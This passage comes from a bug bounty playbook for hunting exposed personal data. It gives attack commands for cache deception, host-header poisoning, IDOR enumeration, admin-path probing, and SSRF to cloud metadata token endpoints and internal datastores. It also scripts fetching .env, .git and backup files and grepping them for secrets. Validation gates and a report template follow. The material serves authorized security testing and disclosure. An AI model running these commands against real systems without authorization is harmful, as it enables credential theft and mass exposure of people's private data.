---

### CLASS 10 — Web Cache Deception / Cache Poisoning → PII

**What it is**:
- **Cache deception**: Attacker tricks CDN into caching a victim's private profile page,
  then reads the cached response to get PII
- **Cache poisoning**: Attacker poisons a cached response with a web cache key injection
  to serve a different user's PII

**Hunt vectors:**

```bash
HOST="https://target.com"

# Web Cache Deception test
# Step 1: Victim visits their profile
# Step 2: Attacker appends a fake static extension to the same URL
for SUFFIX in ".css" ".js" ".png" ".jpg" "/style.css" "/.css" "/../style.css"; do
  echo "Testing: $HOST/account/profile$SUFFIX"
  # As attacker, does this return victim's cached profile?
  # Check: X-Cache, CF-Cache-Status, Age headers — if HIT, cached PII exposed
  curl -s -I "$HOST/account/profile$SUFFIX" | grep -iE "x-cache|cf-cache|age|cache-control"
done

# Cache key injection (host header, port, scheme variations)
curl -s -H "X-Forwarded-Host: attacker.com" "$HOST/api/me" | grep -iE "email|name|phone"
curl -s -H "X-Host: attacker.com" "$HOST/api/me" | grep -iE "email|name|phone"

# Vary header bypass — does the cache key include Authorization?
curl -s -H "Authorization: Bearer $TOKEN_A" "$HOST/api/me" -I | grep -i "vary"
# If Vary doesn't include Authorization, the response may cache across users
```

---

### CLASS 11 — Third-Party Integrations Leaking PII

**What it is**: Analytics, tracking, support chat, CRM integrations that receive PII
in event payloads that should never include it.

**Hunt vectors:**

```bash
# Intercept all third-party requests in Burp — filter by common analytics domains
# Look at network tab for requests to:
# analytics.google.com, segment.io, mixpanel.com, amplitude.com,
# intercom.io, zendesk.com, hubspot.com, salesforce.com

# Manual check in browser DevTools → Network → Filter by third-party domains
# Look at request payloads for:
# - full name, email, phone in analytics events
# - user ID that maps to PII
# - POST body including "user_email", "customer_email", "phone"

# Check Segment/Amplitude event schemas via JS
grep -rihE '(analytics|mixpanel|amplitude|segment)\.(track|identify|page)\(' beautified/ | head -20
# Look for: identify({email: ..., name: ..., phone: ...}) calls

# GDPR angle: PII in analytics = reportable even if "low impact" by program
# Frame as: "PII transmitted to third-party processor without explicit consent mapping"
```

---

### CLASS 12 — PDF / Invoice / Report Generation with Cross-User PII

**What it is**: Document generation endpoints that produce PDFs/invoices/reports
containing another user's data when given a different user's document ID.

**Hunt vectors:**

```bash
# Step 1: Generate your own invoice/receipt/PDF
curl -s "$HOST/api/invoices/$MY_INVOICE_ID/pdf" \
  -H "Authorization: Bearer $MY_TOKEN" -o my_invoice.pdf
pdftotext my_invoice.pdf - | grep -iE "email|phone|name|address" | head -5

# Step 2: IDOR — try another user's invoice ID
curl -s "$HOST/api/invoices/$OTHER_INVOICE_ID/pdf" \
  -H "Authorization: Bearer $MY_TOKEN" -o other_invoice.pdf -w "%{http_code}"

# Step 3: Invoice ID enumeration
for ID in $(seq $((MY_INV_ID-3)) $((MY_INV_ID+3))); do
  [ "$ID" -eq "$MY_INV_ID" ] && continue
  CODE=$(curl -so /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $MY_TOKEN" "$HOST/api/invoices/$ID/pdf")
  echo "INV_ID=$ID → HTTP $CODE"
done

# Step 4: Public invoice URL (no auth required, guessable token)
# Pattern: /invoices/download?token=XXXXXXXXXX
# Try: increment token, decode base64, change last chars
curl -s "$HOST/api/reports/generate" \
  -H "Authorization: Bearer $MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type":"user_report","userId":"'"$OTHER_USER_ID"'"}' | head -5
```

---

### CLASS 13 — Admin Panel / Internal Dashboard Mass PII Access

**What it is**: Admin endpoints accessible to low-privilege users, or admin paths
discoverable via JS that return mass user PII.

**Hunt vectors:**

```bash
# From JS recon — find admin paths in JS bundles
grep -rihE '"/admin|/dashboard/admin|/internal/|/staff/|/support/' beautified/ | \
  grep -oE '"(/[^"]+)"' | sort -u | head -30

# Test each admin endpoint with low-priv token
while read ADMIN_PATH; do
  CODE=$(curl -so /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $LOW_PRIV_TOKEN" "https://$HOST$ADMIN_PATH")
  echo "$CODE $ADMIN_PATH"
done < admin_paths.txt | grep "^200"

# Admin user list endpoints
for PATH in \
  /admin/users /admin/customers /admin/members /admin/accounts \
  /api/admin/users /api/admin/customers /api/internal/users \
  /staff/users /support/users /dashboard/users \
  /api/v1/admin/users /api/v2/admin/users; do
  curl -s -H "Authorization: Bearer $LOW_PRIV_TOKEN" "https://$HOST$PATH" | \
    python3 -c "import sys,json; \
      try:
        d=json.load(sys.stdin);
        items=d if isinstance(d,list) else d.get('data',d.get('users',[]));
        print(f'[HIT] PATH={\"$PATH\"} COUNT={len(items)} FIELDS={list(items[0].keys()) if items else []}')
      except: pass" 2>/dev/null
done

# Role elevation — JWT/cookie manipulation to become admin
# (if JWT is tampered and admin=true returns user list → vertical privesc → mass PII)
```

---

### CLASS 14 — SSRF → Internal PII Datastores

**What it is**: SSRF that reaches internal data services — Elasticsearch, MongoDB,
Redis — or cloud metadata that yields IAM creds which then access PII datastores.

**Hunt vectors:**

```bash
# SSRF discovery — find URL/webhook/PDF-URL parameters
grep -rihE 'url=|webhook=|callback=|redirect=|fetch=|load=|img=|pdf=' api_endpoints.txt

# Test for SSRF with internal targets
COLLABORATOR="https://UNIQUE.interact.sh"

for PARAM in url webhook callback pdf_url document_url fetch_url avatar_url logo_url; do
  curl -s "$HOST/api/upload?$PARAM=$COLLABORATOR/test" \
    -H "Authorization: Bearer $TOKEN" | head -3 &
done

# If SSRF confirmed → pivot to internal Elasticsearch with user data
curl -s "$HOST/api/upload?url=http://169.254.169.254/latest/meta-data/"
curl -s "$HOST/api/upload?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s "$HOST/api/upload?url=http://internal-elasticsearch:9200/users/_search?size=1"
curl -s "$HOST/api/upload?url=http://internal-mongodb:27017/admin"
```

---

### CLASS 15 — Leaked Source / Config Files with Embedded PII

**What it is**: `.git`, `.env`, backup files, source maps, or config files that contain
hardcoded PII (test accounts with real user data, DB seeds, audit logs).

**Hunt vectors:**

```bash
for HOST in $(cat live.txt | awk '{print $1}'); do
  # Git repository exposure
  for GIT_PATH in /.git/HEAD /.git/config /.git/COMMIT_EDITMSG; do
    CODE=$(curl -so /dev/null -w "%{http_code}" "$HOST$GIT_PATH")
    [[ "$CODE" == "200" ]] && echo "[GIT EXPOSED] $HOST$GIT_PATH"
  done

  # Environment / config files
  for ENV_PATH in /.env /.env.local /.env.production /.env.backup \
                  /config.json /config.yaml /config.yml /app.config \
                  /application.properties /application.yml \
                  /settings.py /local_settings.py /database.yml \
                  /wp-config.php.bak /wp-config.php~ /config.php.bak; do
    CODE=$(curl -so /dev/null -w "%{http_code}" "$HOST$ENV_PATH")
    if [[ "$CODE" == "200" ]]; then
      echo "[CONFIG EXPOSED] $HOST$ENV_PATH"
      curl -s "$HOST$ENV_PATH" | grep -iE "password|secret|key|token|email|user|pass" | head -5
    fi
  done

  # Database / backup files
  for BACKUP in /backup.sql /db.sql /database.sql /users.sql \
                /data.csv /users.csv /customers.csv /members.csv \
                /export.json /users.json /accounts.json; do
    CODE=$(curl -so /dev/null -w "%{http_code}" "$HOST$BACKUP")
    [[ "$CODE" == "200" ]] && echo "[BACKUP EXPOSED] $HOST$BACKUP"
  done
done

# Trufflehog on discovered source
git-dumper "$HOST/.git" ./dumped_repo/ 2>/dev/null
trufflehog filesystem ./dumped_repo/ --only-verified 2>/dev/null | head -20
```

---

## PHASE 4 — CROSS-TENANT CONFIRMATION

For every PII hit found in Phase 3, confirm cross-tenant access before reporting:

```bash
# Cross-tenant confirmation checklist
# [ ] Hit the endpoint as User A reading User B's data
# [ ] Confirm the data is actually User B's (not just any user's, specifically someone else's)
# [ ] Confirm it's NOT your own data being returned
# [ ] Try without auth header (is this completely unauth?)
# [ ] Check: does pagination/filtering reveal MORE users?

# Measure scale — without bulk extraction
# Option 1: count via metadata
curl -s "$HOST/api/users?page=1&limit=1" -H "Authorization: Bearer $TOKEN" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); \
    print('TOTAL:', d.get('total',d.get('count',d.get('totalCount','unknown'))))"

# Option 2: Elasticsearch count endpoint
curl -s "http://OPEN_ES:9200/users/_count" | python3 -c "import sys,json; \
  print('COUNT:', json.load(sys.stdin).get('count','?'))"

# Option 3: Range-probe sequential IDs — do NOT enumerate all, probe 5-10 to estimate density
for ID in 1 100 1000 10000 100000; do
  CODE=$(curl -so /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" "$HOST/api/users/$ID")
  echo "ID=$ID → $CODE"
done

# Hard exfil cap: stop after 1 sample record + count metadata
# Do NOT loop over all users, do NOT download the full dataset
```

---

## PHASE 5 — IMPACT AMPLIFICATION

Before writing the report, maximize impact evidence:

**Impact amplifiers for PII bugs:**

| Amplifier | How to demonstrate |
|---|---|
| Scale (user count) | `_count` endpoint, pagination `total`, Wayback estimate |
| Unauthenticated | Remove auth header entirely — still works? |
| Cross-tenant | User A token → User B's data confirmed |
| Regulatory jurisdiction | EU users = GDPR; US health = HIPAA; US finance = GLBA |
| Bulk exportable | Export endpoint returns all records in one call |
| Real-time / live | Data is current, not historical/stale |
| Sensitive category | Health/financial/government ID triples severity |
| Chain to ATO | PII → password reset → ATO = P1 regardless of other factors |

**PII data type severity matrix:**

| PII Category | Regulatory Impact | Bug Bounty Severity |
|---|---|---|
| Name + Email only | Low baseline | P3/Medium |
| Phone number | Medium | P3/Medium |
| Physical address | Medium | P2/Medium-High |
| Date of birth | Medium | P2/High (ID fraud risk) |
| Government ID (SSN, passport, DL) | Critical — GDPR Art 9 | P1/Critical |
| Financial (card, bank, IBAN) | Critical — PCI-DSS | P1/Critical |
| Medical / health records | Critical — HIPAA/GDPR Art 9 | P1/Critical |
| Biometric data | Critical — GDPR Art 9 | P1/Critical |
| Precise geolocation (live) | High — GDPR | P1/High |
| Sexual orientation / religion | Critical — GDPR Art 9 | P1/Critical |
| Full profile (name+email+phone+address) | High — GDPR | P1/High |
| >10,000 records of any PII type | Mass exposure multiplier | +1 severity tier |

---

## PHASE 6 — COVERAGE LEDGER

Track every class checked. Do NOT declare "nothing found" until ALL are ticked.

```
[ ] CLASS 1  — API over-fetching / excessive data exposure
[ ] CLASS 2  — IDOR → cross-account PII read
[ ] CLASS 3  — GraphQL mass PII query
[ ] CLASS 4  — Export / download / report IDOR
[ ] CLASS 5  — Search / autocomplete / typeahead PII enum
[ ] CLASS 6  — Open cloud storage (S3/GCS/Azure/Firebase)
[ ] CLASS 7  — Open datastores (Elasticsearch/MongoDB/Redis)
[ ] CLASS 8  — Error / debug / log endpoints with PII
[ ] CLASS 9  — Notification / email / SMS API PII
[ ] CLASS 10 — Web cache deception / cache poisoning
[ ] CLASS 11 — Third-party integration PII leakage
[ ] CLASS 12 — PDF / invoice / report generation IDOR
[ ] CLASS 13 — Admin panel / dashboard mass PII access
[ ] CLASS 14 — SSRF → internal PII datastores
[ ] CLASS 15 — Leaked source / config files with embedded PII
```

---

---

# PII VALIDATION GATES — SEPARATE PIPELINE

## Run EVERY finding through ALL 9 gates before writing a report.
## One gate fails → KILL or DOWNGRADE. No exceptions.

---

## GATE 0 — LIVENESS CHECK (60 seconds)

```
[ ] The endpoint / resource is LIVE and accessible RIGHT NOW
[ ] The response contains ACTUAL user data (not just field names, not mocked data)
[ ] You confirmed this within the last 24 hours (PII endpoints get patched fast)
[ ] The data is production data (not obviously seeded test data like "Test User 1")
```

**Kill signal**: Response contains "Lorem Ipsum", "Test User", "example@example.com" throughout
→ this is sample/demo data → **DOWNGRADE to Info** → verify with program if they consider it valid.

---

## GATE 1 — PII SENSITIVITY CHECK (2 minutes)

Classify the PII type and baseline severity:

```
Is the exposed data ACTUALLY sensitive?
[ ] Real names alone: LOW baseline (names are often public)
[ ] Email addresses: MEDIUM (contact PII, spam/phishing risk)
[ ] Phone numbers: MEDIUM-HIGH
[ ] Full profiles (name+email+phone+address): HIGH
[ ] Government IDs / SSN / passport: CRITICAL
[ ] Financial data (card, bank account): CRITICAL
[ ] Medical / health records: CRITICAL
[ ] Biometric data: CRITICAL
[ ] Combinations of the above: escalate to highest tier

Result:
[ ] Data sensitivity = [___________]
[ ] Baseline severity = [___________]
```

**Kill signal**: Exposed data is limited to usernames or display names that are already
public on the platform (e.g., public profiles) → **KILL — not PII in context**.

---

## GATE 2 — REAL USER DATA CONFIRMATION (3 minutes)

```
[ ] I can confirm at least ONE field contains a REAL user's data
    (e.g., the email domain is a real company, the name is a real human name pattern)
[ ] The data is NOT my own test account data
[ ] If I queried another user's ID, I confirmed the ID belongs to a different person
    (e.g., I registered two accounts and confirmed cross-access)
[ ] Scale is confirmed: at least an estimate of total user count exists
    (from pagination metadata, _count endpoint, or range probe)

Exfil confirmation:
[ ] I stopped after 1 redacted sample record + count metadata
[ ] I did NOT download or retain a dataset of real user records
```

**Kill signal**: The only "PII" visible is your own test account's data → **KILL — no
cross-account access demonstrated**.

---

## GATE 3 — AUTHORIZATION BOUNDARY CHECK (2 minutes)

```
[ ] The access is UNAUTHORIZED relative to what the actor should be allowed:
    [ ] Unauthenticated user reading any user's data (Auth bypass)
    [ ] Low-priv user reading another user's data (IDOR/BOLA)
    [ ] Tenant A reading Tenant B's data (Cross-tenant)
    [ ] Regular user reading admin-only data (Vertical privesc)

[ ] NOT a case where:
    [ ] Admin reads user data (expected, not a bug on 99% of programs)
    [ ] User reads their own data (no bug at all)
    [ ] Public data that users knowingly made public

[ ] The access persists with the MINIMUM required auth:
    [ ] Unauthenticated? → confirmed with no auth headers
    [ ] Low-priv only? → confirmed with fresh low-priv session
```

**Kill signal**: The finding only works with admin credentials → **KILL — admin reading
user data is not a vulnerability in bug bounty context**.

---

## GATE 4 — SCOPE & JURISDICTION CHECK (2 minutes)

```
[ ] The vulnerable endpoint is on an IN-SCOPE asset
    (checked the live program scope page, not assumed)
[ ] It's a production asset (not a sandbox/test/demo environment — unless those
    are in scope AND contain real user data)
[ ] It's not a third-party SaaS the company just subscribes to
    (e.g., Salesforce, HubSpot, Zendesk — not in scope unless program explicitly says so)

Regulatory impact (report this in the finding, amplifies severity):
[ ] Affected users in EU → GDPR applies (Article 83 fines up to 4% global revenue)
[ ] Affected users with health data → HIPAA if US target
[ ] Affected users with financial data → PCI-DSS / GLBA if US target
[ ] If none apply, note jurisdiction for context only
```

**Kill signal**: Endpoint is on a third-party analytics/CRM service → **KILL — out of scope**
(unless program explicitly includes third-party services hosting their data).

---

## GATE 5 — REPRODUCIBILITY CHECK (5 minutes)

```
[ ] I can reproduce the finding from a FRESH session (not relying on existing state)
[ ] Steps can be performed in under 5 minutes by a triager
[ ] I have a single curl command (or 2-step sequence) that proves the bug
[ ] No exotic tooling required — standard curl/Burp/Postman is enough
[ ] The exploit requires no social engineering of the victim
[ ] The finding does NOT depend on:
    [ ] A race condition that rarely wins
    [ ] Victim visiting a specific URL first
    [ ] Victim having a specific non-default setting
    [ ] Physical access to victim's device
```

**Write the exact proof curl now (required for Gate 6):**

```bash
# Template — fill this in before proceeding
curl -s \
  -H "Authorization: Bearer ATTACKER_LOW_PRIV_TOKEN" \
  "https://target.com/api/users/VICTIM_ID" | \
  jq '.email, .phone, .address'

# Expected response:
# "victim@example.com"
# "+1-555-0100"
# "123 Main St, San Francisco, CA"
```

**Kill signal**: Cannot produce a single reproducible HTTP request → **KILL — not ready to report**.

---

## GATE 6 — SCALE & SEVERITY CALIBRATION (3 minutes)

Assign final severity based on:

```
Data sensitivity:      [LOW / MEDIUM / HIGH / CRITICAL]
Scale (user count):    [1 / <100 / <10k / <1M / >1M]
Auth required:         [None / Low-priv / High-priv]
Victim interaction:    [None / Must click / Must visit]
Regulatory breach:     [None / GDPR / HIPAA / PCI-DSS]
Chain potential:       [Standalone / Leads to ATO / Leads to financial fraud]
```

**Severity decision table:**

| Data Type | Unauth | Low-priv | High-priv (LOW-PRIV ONLY bugs) |
|---|---|---|---|
| Email only | P3 Medium | P3 Medium | KILL |
| Phone + address | P2 High | P3 Medium | KILL |
| Full profile (name/email/phone/address) | P1 Critical | P2 High | P3 Medium |
| Financial PII | P1 Critical | P1 Critical | P2 High |
| Health PII | P1 Critical | P1 Critical | P2 High |
| Government ID | P1 Critical | P1 Critical | P2 High |
| Any PII × >100k users | +1 tier | +1 tier | +1 tier |

**CVSS 3.1 vectors for common PII findings:**

| Scenario | CVSS Score | Vector |
|---|---|---|
| Unauth read any user's full profile | 7.5 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| Low-priv IDOR read another user's profile | 6.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
| Unauth mass PII (>10k records) | 9.1 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N |
| IDOR read health/financial PII | 8.1 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
| Open Elasticsearch with user records | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Export IDOR leaking all users | 8.6 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |
| Cross-tenant GraphQL PII query | 7.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |

---

## GATE 7 — DEDUPLICATION CHECK (5 minutes)

```
[ ] Searched program's HackerOne/Bugcrowd Hacktivity for: endpoint name + "PII" + "data exposure"
[ ] Searched GitHub issues for the target repo: "data leak", "user data", "privacy"
[ ] Checked program's policy for "known issues" or explicitly excluded PII patterns
[ ] Googled: "site:hackerone.com/reports target.com user data"
[ ] Read most recent 5 disclosed reports for this program — no overlap
[ ] This specific endpoint / data class is NOT already reported
```

**Kill signal**: Found a disclosed report on HackerOne for this same endpoint with the same
class → **KILL — duplicate**. If slight variant, note the prior report and differentiate clearly.

---

## GATE 8 — REPORT QUALITY CHECK (10 minutes)

```
[ ] Title follows formula: [Bug Class] in [Endpoint] exposes [PII Type] of [Scope/Count] users
    Example: "IDOR in /api/users/{id} exposes full profile PII of any registered user"
    Example: "Unauthenticated /api/admin/export returns CSV with all 2.3M user records"

[ ] Impact statement (sentence 1 = what attacker walks away with RIGHT NOW):
    "An unauthenticated attacker can request any user's full profile — including full name,
    email, phone number, and home address — by substituting any integer user ID in the path
    parameter of /api/users/{id}."

[ ] Steps to Reproduce:
    - Copy-paste curl command works from scratch
    - Token used is a real low-priv test account token (attacker-controlled)
    - User ID used is a DIFFERENT test account's ID
    - Response shown is the ACTUAL response (redact real victim data with [REDACTED])

[ ] Evidence:
    - Redacted screenshot or response body showing PII fields exist
    - Count evidence (pagination total, _count, range probe)
    - NOT bulk-extracted data

[ ] Severity: CVSS vector computed (not just the score number)
[ ] Regulatory impact noted: "EU users affected → GDPR Art. 83 notification risk"
[ ] Remediation: 1-2 sentences of concrete fix
    (e.g., "Verify that the authenticated user's ID matches the requested resource ID
    on every /api/users/{id} endpoint before returning profile data")
[ ] NEVER used "could potentially" / "may allow" / "could be exploited to"
```

---

## GATE 9 — FINAL PII-SPECIFIC KILL LIST CHECK (2 minutes)

These submit as N/A on PII reports. Check before submitting:

```
KILL if:
[ ] The only "PII" exposed is usernames or display names that are intentionally public
[ ] Email enumeration only (no PII returned, just existence confirmation) → Info/Low
[ ] Your own data accessible through your own session → no bug
[ ] Admin can access user data → expected, not a bug
[ ] Exposed data is clearly seeded/test data, not real users
[ ] The endpoint requires admin credentials to access the PII
[ ] Data is already publicly visible on the user's public profile
[ ] The "leak" is only to the user themselves (e.g., /api/me returns your own PII)
[ ] Fields are present in response but empty/null for all users
[ ] Data accessible only in logs/error messages that require server access to read

DOWNGRADE (not kill) if:
[ ] Impact limited to 1 specific user's data → P3/Medium (not P1)
[ ] Data is name + email only, no phone/address/financial → P3/Medium max
[ ] Requires a known victim UUID (not enumerable) → note limitation in report, P3
[ ] Data is 6+ months old / clearly stale → note in report, may reduce severity
[ ] Third-party analytics receives PII → note, often P3/Low depending on program
```

---

## PII HUNT NEVER SUBMIT LIST

These waste submissions and hurt your validity ratio:

```
✗ Email enumeration via registration/reset forms alone (returns "email taken" only)
✗ Username enumeration (usernames are public)
✗ Your own account's PII visible at /api/me
✗ Admin reading user data (admin → user is expected)
✗ PII in logs accessible only via server/SSH access (not HTTP-accessible)
✗ "Third-party may receive PII" without proving it (speculation)
✗ GDPR compliance advice (not a security bug — a legal/process recommendation)
✗ PII in cookies that are HttpOnly and encrypted
✗ Autocomplete returning only names (not contact/financial/health PII)
✗ Rate limit missing on a PII endpoint (without a working brute-force PoC)
✗ Test/seed data in a staging environment not explicitly in scope
✗ Public-facing user profiles exposing data the user chose to make public
```

---

## PII CONDITIONALLY VALID — CHAIN REQUIRED TABLE

| Standalone Finding | Chain Required | Valid Severity |
|---|---|---|
| Email enumeration | + full profile read on lookup → mass PII exposure | High |
| Email enumeration | + password reset → ATO | Critical |
| PII in JS bundle | + credential leak verified live | High |
| PII in old Wayback cache | + data still live/accurate at present | Medium |
| Export IDOR (job ID only) | + confirmed returns victim's records | High |
| S3 bucket listing | + objects contain real user PII records | Critical |
| GraphQL introspection | + can query PII fields cross-tenant | High |
| Cache deception PoC | + attacker can read victim's cached PII response | High |
| Notification API | + response reveals target's email/phone/name | Medium |
| Open Redis | + keys contain session tokens with PII claims | Critical |

---

## PII REPORT TEMPLATE

```
TITLE:
[Bug Class] in [Endpoint/Feature] exposes [PII Type] of [Scope] to [Actor]

Example:
"Unauthenticated IDOR in /api/v2/users/{id} exposes full profile PII of any user"

---

SUMMARY (2 sentences max):
An [unauthenticated / low-privilege authenticated] attacker can [action] by [mechanism],
exposing [PII type] for [scope: any user / all N users / any user in tenant].
This constitutes a GDPR Art. 5(1)(f) integrity/confidentiality violation and may trigger
Art. 33 breach notification obligations for the data controller.

---

IMPACT:
- Attacker retrieves: [exact fields: full name, email, phone, address, DOB]
- Affected users: [count or "any registered user"]
- Required privileges: [none / free account / specific role]
- Victim interaction required: none
- Regulatory: [GDPR / HIPAA / PCI-DSS] notification risk

---

STEPS TO REPRODUCE:
1. Register two test accounts (Account A = attacker, Account B = victim)
2. Note Account B's user ID from [source: URL / response field / invitation link]
3. As Account A, send the following request:

   curl -s \
     -H "Authorization: Bearer ACCOUNT_A_TOKEN" \
     "https://target.com/api/v2/users/ACCOUNT_B_USER_ID" | jq .

4. Response contains Account B's full profile:
   {
     "id": "[ACCOUNT_B_ID]",
     "email": "[REDACTED]@example.com",
     "phone": "+1-[REDACTED]",
     "address": "[REDACTED], CA 94102",
     "dateOfBirth": "[REDACTED]"
   }

5. To confirm scale: curl -s -H "Authorization: Bearer ACCOUNT_A_TOKEN" \
   "https://target.com/api/v2/users?page=1&limit=1" | jq '.total'
   → {"total": 847293}

---

EVIDENCE:
[Attach: screenshot of response with PII fields visible but values redacted]
[Attach: pagination total confirming scale]

---

CVSS 3.1:
Score: X.X ([CRITICAL/HIGH/MEDIUM])
Vector: AV:N/AC:L/PR:[N/L/H]/UI:N/S:U/C:H/I:[N/H]/A:N

---

REMEDIATION:
On every `/api/v2/users/{id}` read, verify that `request.user.id == params.id` before
returning profile data. Apply this check server-side on all profile-reading endpoints.
For export endpoints, scope the export query to the authenticated user's own records only.
```

---

## TOOL REFERENCE — PII HUNT TOOLKIT

```bash
# Surface mapping
subfinder, amass, httpx, naabu, shodan

# JS recon (mandatory per doctrine)
katana, hakrawler, gospider, waybackurls, gau, js-beautify, sourcemapper

# API analysis
arjun, paramspider, ffuf, x8

# GraphQL
graphql-cop, clairvoyance, graphw00f

# Secret / PII scanning
trufflehog, gitleaks, noseyparker, jsluice, SecretFinder, mantra

# Cloud storage
aws-cli (s3 ls --no-sign-request), gsutil, s3scanner, GCPBucketBrute

# Datastores (passive check)
shodan, censys, fofa

# Collaboration / SSRF OOB
interactsh, Burp Collaborator, canarytokens.org

# PDF analysis
pdftotext, pdfinfo, exiftool

# Deduplication
hakrawler | httpx | uro (URL dedup)
```
